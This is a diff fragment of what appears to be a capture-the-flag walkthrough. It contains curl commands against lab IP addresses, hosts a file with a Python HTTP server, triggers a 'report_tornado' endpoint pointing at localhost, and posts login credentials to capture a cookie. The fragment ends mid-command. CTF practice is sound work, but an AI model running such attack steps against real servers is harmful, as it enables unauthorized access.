@@ -48,12 +48,15 @@ Get the status of the Ip Machine to know about it
 `curl -X GET "http://94.237.63.109:45919/stats"`
 
 Run the following command to host index.html file http server.
+
 `python -m http.server 1337`
 
 Reporting a Tornado on the Box server.
+
 `curl "http://94.237.59.207:47563/report_tornado?ip=127.0.0.1"`
 
 Inject the new User to the server for getting access and store cookie data
+
 `curl -X POST "http://94.237.59.207:47563/login" \           
 -H "Content-Type: application/json" \
 -d '{"username": "kittykat", "password": "kittykat"}' \
